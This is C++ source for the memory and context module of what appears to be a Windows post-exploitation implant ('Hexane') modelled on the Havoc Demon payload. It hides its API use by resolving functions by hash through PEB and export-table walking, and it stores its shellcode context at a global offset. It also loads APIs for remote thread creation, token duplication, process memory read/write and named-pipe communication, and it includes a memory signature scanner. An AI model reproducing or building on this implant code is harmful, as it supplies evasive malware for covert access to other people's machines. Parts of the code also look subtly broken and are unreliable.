#include <core/include/memory.hpp>
#ifndef ENDIANESS
#define ENDIANESS 1
#endif

namespace Memory {

    VOID PatchMemory(byte *dst, byte const *src, int d_offs, int s_offs, size_t n) {

        for (auto i = 0; i < n; i++) {
            (dst)[d_offs + i] = (src)[s_offs + i];
        }
    }

    VOID GetProcessHeaps(void *process, uint32_t access, uint32_t pid) {
        HEXANE

        HEAPLIST32 heaps = { };
        heaps.dwSize = sizeof(HEAPLIST32);

        if (!NT_SUCCESS(Process::NtOpenProcess(&process, access, pid))) {
            return;
        }

        auto snap = Ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPHEAPLIST, pid);
        if (snap == INVALID_HANDLE_VALUE) {
            return;
        }

        if (Heap32ListFirst(snap, &heaps)) {
            do {
                HeapInfo heap_info = { heaps.th32HeapID, heaps.th32ProcessID };
                //m_heaps.push_back(heap_info);
            } while (Heap32ListNext(snap, &heaps));
        } else {
            return;
        }
    }

    PRSRC GetIntResource(HMODULE base, int RsrcId) {
        HEXANE

        HRSRC hResInfo  = { };
        PRSRC Object    = { };

        Object = S_CAST(PRSRC, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(RSRC)));

        if (
            !(hResInfo          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(RsrcId), RT_RCDATA)) ||
            !(Object->hGlobal   = Ctx->win32.LoadResource(base, hResInfo)) ||
            !(Object->Size      = Ctx->win32.SizeofResource(base, hResInfo)) ||
            !(Object->ResLock   = Ctx->win32.LockResource(Object->hGlobal))) {

            Ctx->Nt.RtlFreeHeap(LocalHeap, 0, Object);
            return nullptr;
        }

        return Object;
    }

    namespace Context {

        VOID ResolveApi() {
            HEXANE
            OSVERSIONINFOW OSVersionW = {};

            x_memset(&Ctx->LE, ENDIANESS, 1);
            if (!(Ctx->Modules.kernel32 = M_PTR(KERNEL32))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (!(F_PTR_HASHES(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            // WinVersion resolution : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
            Ctx->Session.OSVersion          = WIN_VERSION_UNKNOWN;
            OSVersionW.dwOSVersionInfoSize  = sizeof(OSVersionW);

            if (!NT_SUCCESS(Ctx->Nt.RtlGetVersion(&OSVersionW))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (OSVersionW.dwMajorVersion >= 5) {
                if (OSVersionW.dwMajorVersion == 5) {
                    if (OSVersionW.dwMinorVersion == 1) {
                        Ctx->Session.OSVersion = WIN_VERSION_XP;
                    }
                }
                else if (OSVersionW.dwMajorVersion == 6) {
                    if (OSVersionW.dwMinorVersion == 0) {
                        Ctx->Session.OSVersion = WIN_VERSION_2008;
                    } else if (OSVersionW.dwMinorVersion == 1) {
                        Ctx->Session.OSVersion = WIN_VERSION_2008_R2;
                    } else if (OSVersionW.dwMinorVersion == 2) {
                        Ctx->Session.OSVersion = WIN_VERSION_2012;
                    } else if (OSVersionW.dwMinorVersion == 3) {
                        Ctx->Session.OSVersion = WIN_VERSION_2012_R2;
                    }
                }
                else if (OSVersionW.dwMajorVersion == 10) {
                    if (OSVersionW.dwMinorVersion == 0) {
                        Ctx->Session.OSVersion = WIN_VERSION_2016_X;
                    }
                }
            }

            if (
                !(F_PTR_HMOD(Ctx->win32.GetLastError,                 Ctx->Modules.kernel32, GETLASTERROR)) ||
                !(F_PTR_HMOD(Ctx->win32.IsWow64Process,               Ctx->Modules.kernel32, ISWOW64PROCESS)) ||
                !(F_PTR_HMOD(Ctx->win32.GlobalMemoryStatusEx,         Ctx->Modules.kernel32, GLOBALMEMORYSTATUSEX))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (
                !(F_PTR_HMOD(Ctx->Nt.NtAllocateVirtualMemory,         Ctx->Modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlAllocateHeap,                 Ctx->Modules.ntdll, RTLALLOCATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtFreeVirtualMemory,             Ctx->Modules.ntdll, NTFREEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtReadVirtualMemory,             Ctx->Modules.ntdll, NTREADVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtWriteVirtualMemory,            Ctx->Modules.ntdll, NTWRITEVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtQueryVirtualMemory,            Ctx->Modules.ntdll, NTQUERYVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtCreateSection,                 Ctx->Modules.ntdll, NTCREATESECTION)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtMapViewOfSection,              Ctx->Modules.ntdll, NTMAPVIEWOFSECTION)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtUnmapViewOfSection,            Ctx->Modules.ntdll, NTUNMAPVIEWOFSECTION)) ||

                !(F_PTR_HMOD(Ctx->Nt.NtCreateUserProcess,             Ctx->Modules.ntdll, NTCREATEUSERPROCESS)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtTerminateProcess,              Ctx->Modules.ntdll, NTTERMINATEPROCESS)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtOpenProcess,                   Ctx->Modules.ntdll, NTOPENPROCESS)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtOpenProcessToken,              Ctx->Modules.ntdll, NTOPENPROCESSTOKEN)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtOpenThreadToken,               Ctx->Modules.ntdll, NTOPENTHREADTOKEN)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtDuplicateObject,               Ctx->Modules.ntdll, NTDUPLICATEOBJECT)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtDuplicateToken,                Ctx->Modules.ntdll, NTDUPLICATETOKEN)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtQueryInformationToken,         Ctx->Modules.ntdll, NTQUERYINFORMATIONTOKEN)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtQueryInformationProcess,       Ctx->Modules.ntdll, NTQUERYINFORMATIONPROCESS)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtQuerySystemInformation,        Ctx->Modules.ntdll, NTQUERYSYSTEMINFORMATION)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtClose,                         Ctx->Modules.ntdll, NTCLOSE)) ||

                !(F_PTR_HMOD(Ctx->Nt.RtlRandomEx,                     Ctx->Modules.ntdll, RTLRANDOMEX)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtResumeThread,                  Ctx->Modules.ntdll, NTRESUMETHREAD)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtGetContextThread,              Ctx->Modules.ntdll, NTGETCONTEXTTHREAD)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtSetContextThread,              Ctx->Modules.ntdll, NTSETCONTEXTTHREAD)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtSetInformationThread,          Ctx->Modules.ntdll, NTSETINFORMATIONTHREAD)) ||
                !(F_PTR_HMOD(Ctx->Nt.NtWaitForSingleObject,           Ctx->Modules.ntdll, NTWAITFORSINGLEOBJECT)) ||
                !(F_PTR_HMOD(Ctx->Nt.TpAllocWork,                     Ctx->Modules.ntdll, TPALLOCWORK)) ||
                !(F_PTR_HMOD(Ctx->Nt.TpPostWork,                      Ctx->Modules.ntdll, TPPOSTWORK)) ||
                !(F_PTR_HMOD(Ctx->Nt.TpReleaseWork,                   Ctx->Modules.ntdll, TPRELEASEWORK)) ||

                !(F_PTR_HMOD(Ctx->Nt.RtlCreateHeap,                   Ctx->Modules.ntdll, RTLCREATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlReAllocateHeap,               Ctx->Modules.ntdll, RTLREALLOCATEHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlFreeHeap,                     Ctx->Modules.ntdll, RTLFREEHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlDestroyHeap,                  Ctx->Modules.ntdll, RTLDESTROYHEAP)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlInitUnicodeString,            Ctx->Modules.ntdll, RTLINITUNICODESTRING)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlCreateProcessParametersEx,    Ctx->Modules.ntdll, RTLCREATEPROCESSPARAMETERSEX)) ||
                !(F_PTR_HMOD(Ctx->Nt.RtlDestroyProcessParameters,     Ctx->Modules.ntdll, RTLDESTROYPROCESSPARAMETERS))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }

            if (
                !(F_PTR_HMOD(Ctx->win32.FormatMessageA,               Ctx->Modules.kernel32, FORMATMESSAGEA)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateToolhelp32Snapshot,     Ctx->Modules.kernel32, CREATETOOLHELP32SNAPSHOT)) ||
                !(F_PTR_HMOD(Ctx->win32.Process32First,               Ctx->Modules.kernel32, PROCESS32FIRST)) ||
                !(F_PTR_HMOD(Ctx->win32.Process32Next,                Ctx->Modules.kernel32, PROCESS32NEXT)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateRemoteThread,           Ctx->Modules.kernel32, CREATEREMOTETHREAD)) ||
                !(F_PTR_HMOD(Ctx->win32.GetComputerNameExA,           Ctx->Modules.kernel32, GETCOMPUTERNAMEEXA)) ||
                !(F_PTR_HMOD(Ctx->win32.GetLocalTime,                 Ctx->Modules.kernel32, GETLOCALTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.SleepEx,                      Ctx->Modules.kernel32, SLEEPEX)) ||

                !(F_PTR_HMOD(Ctx->win32.GetCurrentDirectoryA,         Ctx->Modules.kernel32, GETCURRENTDIRECTORYA)) ||
                !(F_PTR_HMOD(Ctx->win32.FileTimeToSystemTime,         Ctx->Modules.kernel32, FILETIMETOSYSTEMTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.GetSystemTimeAsFileTime,      Ctx->Modules.kernel32, GETSYSTEMTIMEASFILETIME)) ||
                !(F_PTR_HMOD(Ctx->win32.SystemTimeToTzSpecificLocalTime, Ctx->Modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME)) ||
                !(F_PTR_HMOD(Ctx->win32.GetFullPathNameA,             Ctx->Modules.kernel32, GETFULLPATHNAMEA)) ||
                !(F_PTR_HMOD(Ctx->win32.CreateFileW,                  Ctx->Modules.kernel32, CREATEFILEW)) ||
                !(F_PTR_HMOD(Ctx->win32.ReadFile,                     Ctx->Modules.kernel32, READFILE)) ||
                !(F_PTR_HMOD(Ctx->win32.WriteFile,                    Ctx->Modules.kernel32, WRITEFILE)) ||
                !(F_PTR_HMOD(Ctx->win32.GetFileSizeEx,                Ctx->Modules.kernel32, GETFILESIZEEX)) ||
                !(F_PTR_HMOD(Ctx->win32.FindFirstFileA,               Ctx->Modules.kernel32, FINDFIRSTFILEA)) ||
                !(F_PTR_HMOD(Ctx->win32.FindNextFileA,                Ctx->Modules.kernel32, FINDNEXTFILEA)) ||
                !(F_PTR_HMOD(Ctx->win32.FindClose,                    Ctx->Modules.kernel32, FINDCLOSE)) ||

                !(F_PTR_HMOD(Ctx->win32.CreateNamedPipeW,             Ctx->Modules.kernel32, CREATENAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.CallNamedPipeW,               Ctx->Modules.kernel32, CALLNAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.WaitNamedPipeW,               Ctx->Modules.kernel32, WAITNAMEDPIPEW)) ||
                !(F_PTR_HMOD(Ctx->win32.ConnectNamedPipe,             Ctx->Modules.kernel32, CONNECTNAMEDPIPE)) ||
                !(F_PTR_HMOD(Ctx->win32.DisconnectNamedPipe,          Ctx->Modules.kernel32, DISCONNECTNAMEDPIPE)) ||
                !(F_PTR_HMOD(Ctx->win32.SetNamedPipeHandleState,      Ctx->Modules.kernel32, SETNAMEDPIPEHANDLESTATE)) ||
                !(F_PTR_HMOD(Ctx->win32.PeekNamedPipe,                Ctx->Modules.kernel32, PEEKNAMEDPIPE))) {
                return_defer(ERROR_PROC_NOT_FOUND);
            }
            defer:
        }

        VOID ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

            HEXANE_CTX Instance = { };
            LPVOID MmAddr = { };
            SIZE_T MmSize = 0;
            ULONG Protect = 0;

            Instance.Teb = NtCurrentTeb();
            Instance.Heap = Instance.Teb->ProcessEnvironmentBlock->ProcessHeap;

            Instance.Teb->LastErrorValue    = ERROR_SUCCESS;
            Instance.Base.Address           = U_PTR(InstStart());
            Instance.Base.Size              = U_PTR(InstEnd()) - Instance.Base.Address;

            MmAddr = C_PTR(GLOBAL_OFFSET);
            MmSize = sizeof(MmAddr);

            if (
                !(Instance.Modules.ntdll = M_PTR(NTDLL)) ||
                !(F_PTR_HMOD(Instance.Nt.NtProtectVirtualMemory, Instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
                !(F_PTR_HMOD(Instance.Nt.RtlAllocateHeap, Instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
                !(F_PTR_HMOD(Instance.Nt.RtlRandomEx, Instance.Modules.ntdll, RTLRANDOMEX))) {
                return;
            }

            if (!NT_SUCCESS(Instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &MmAddr, &MmSize, PAGE_READWRITE, &Protect))) {
                return;
            }
            MmAddr = C_PTR(GLOBAL_OFFSET);
            if (!(C_DREF(MmAddr) = Instance.Nt.RtlAllocateHeap(Instance.Heap, HEAP_ZERO_MEMORY, sizeof(HEXANE_CTX)))) {
                return;
            }

            x_memcpy(C_DREF(MmAddr), &Instance, sizeof(HEXANE_CTX));
            x_memset(&Instance, 0, sizeof(HEXANE_CTX));
            x_memset(C_PTR(U_PTR(MmAddr) + sizeof(LPVOID)), 0, 0xE);
        }

        VOID ContextDestroy(HEXANE_CTX *Ctx) {

            auto RtlFreeHeap = Ctx->Nt.RtlFreeHeap;
            auto Heap = Ctx->Heap;

            x_memset(Ctx, 0, sizeof(HEXANE_CTX));

            if (RtlFreeHeap) {
                RtlFreeHeap(Heap, 0, Ctx);
            }
        }
    }

    namespace Modules {

        HMODULE GetModuleAddress(PLDR_DATA_TABLE_ENTRY entry) {
            return R_CAST(HMODULE, entry->DllBase);
        }

        LDR_DATA_TABLE_ENTRY* GetModuleEntry(uint32_t hash) {
            HEXANE

            PEB peb = { };
            CONTEXT thread_ctx = { };
            PEB_LDR_DATA *load = { };
            HMODULE module = { };

            size_t read = 0;
            wchar_t lowercase[MAX_PATH] = { };

            if (
                !Ctx->Nt.NtGetContextThread(NtCurrentThread(), &thread_ctx) ||
                !Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), REG_PEB_OFFSET(thread_ctx), (LPVOID) & peb, sizeof(PEB), &read)) {
                return nullptr;
            }

            if (read != sizeof(PEB)) {
                return nullptr;
            }

            load = peb.Ldr;
            for (auto head = load->InMemoryOrderModuleList.Flink; head != &load->InMemoryOrderModuleList; head = head->Flink) {
                auto entry = CONTAINING_RECORD(head, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

                if (hash - Utils::GetHashFromStringW(x_wcsToLower(lowercase, entry->BaseDllName.Buffer), entry->BaseDllName.Length) == 0) {
                    return entry;
                }
            }

            return nullptr;
        }

        FARPROC GetSymbolAddress(HMODULE Base, ULONG Hash) {

            FARPROC Export          = { };
            CHAR lowName[MAX_PATH]  = { };

            if (!Base) {
                return nullptr;
            }

            auto DosHead    = IMAGE_DOS_HEADER(Base);
            auto NtHead     = IMAGE_NT_HEADERS(Base, DosHead);
            auto Exports    = IMAGE_EXPORT_DIRECTORY(DosHead, NtHead);

            if (Exports->AddressOfNames) {
                auto Ords   = RVA(PWORD, Base, Exports->AddressOfNameOrdinals);
                auto Fns    = RVA(PULONG, Base, Exports->AddressOfFunctions);
                auto Names  = RVA(PULONG, Base, Exports->AddressOfNames);

                for (auto i = 0; i < Exports->NumberOfNames; i++) {
                    auto Name = RVA(LPSTR, Base, (long) Names[i]);

                    x_memset(lowName, 0, MAX_PATH);

                    if (Hash - Utils::GetHashFromStringA(x_mbsToLower(lowName, Name), x_strlen(Name)) == 0) {
                        Export = R_CAST(FARPROC, RVA(PULONG, Base, Fns[Ords[i]]));
                        break;
                    }
                }
            }

            return Export;
        }

        UINT_PTR GetExportAddress(char *module_name, char *export_name) {
            HEXANE

            UINT_PTR address    = 0;
            INT reload          = 0;

            auto mod_name = Utils::GetHashFromStringA(module_name, x_strlen(module_name));
            auto fn_name = Utils::GetHashFromStringA(export_name, x_strlen(export_name));

            while (!address) {
                if (!(F_PTR_HASHES(address, mod_name, fn_name))) {
                    if (reload || !(Ctx->win32.LoadLibraryA(S_CAST(const char *, module_name)))) {
                        goto defer;
                    }
                    reload++;
                }
            }
            defer:
            return address;
        }
    }

    namespace Scanners {

        UINT_PTR RelocateExport(void *process, void *target, size_t size) {
            HEXANE

            UINT_PTR ret = 0;
            UINT_PTR address = R_CAST(uintptr_t, target);

            for (ret = (address & 0xFFFFFFFFFFF70000) - 0x70000000;
                 ret < address + 0x70000000;
                 ret += 0x10000) {
                if (!NT_SUCCESS(Ctx->Nt.NtAllocateVirtualMemory(process, R_CAST(void **, &ret), 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
                    ret = 0;
                }
            }

            return ret;
        }

        BOOL SignatureMatch(const uint8_t *data, const char *signature, const char *mask) {

            for (; *mask; ++mask, ++data, ++signature) {
                if (*mask == 0x78 && *data != *signature) {
                    return FALSE;
                }
            }
            return (*mask == 0x00);
        }


        UINT_PTR SignatureScan(uintptr_t start, uint32_t size, const char *signature, const char *mask) {
            HEXANE

            uintptr_t address = 0;
            size_t read	= 0;

            auto buffer = R_CAST(uint8_t *, Ctx->Nt.RtlAllocateHeap(GetProcessHeap(), 0, size));
            if (!NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, start), buffer, size, &read))) {
                return 0;
            }

            for (auto i = 0; i < size; i++) {
                if (SignatureMatch(buffer + i, signature, mask)) {
                    address = start + i;
                    break;
                }
            }

            x_memset(buffer, 0, size);
            Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, buffer);

            return address;
        }
    }
}
